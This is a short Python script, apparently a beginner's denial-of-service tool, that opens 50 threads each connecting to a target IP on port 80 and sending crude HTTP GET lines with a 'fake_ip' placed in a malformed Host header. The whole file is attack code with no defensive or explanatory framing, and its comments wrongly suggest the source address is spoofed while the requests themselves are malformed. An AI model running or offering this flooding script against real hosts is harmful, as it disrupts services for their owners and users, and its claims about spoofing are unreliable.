import socket
import threading

target = "192.168.0.1"         # target ip address

port = 80                      # 80 for http

fake_ip = "184.55.56.65"       # host ip address


def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                         # (Internet address and TCP stream)

    s.connect((target, port))                                                     # connect to target website with port either ssh or http.

    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))     # sending requests to target

    s.sendto(("Host /" + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))       # sending requests from host

    s.close()


for i in range(50):
    thread = threading.Thread(target=attack)
    thread.start()
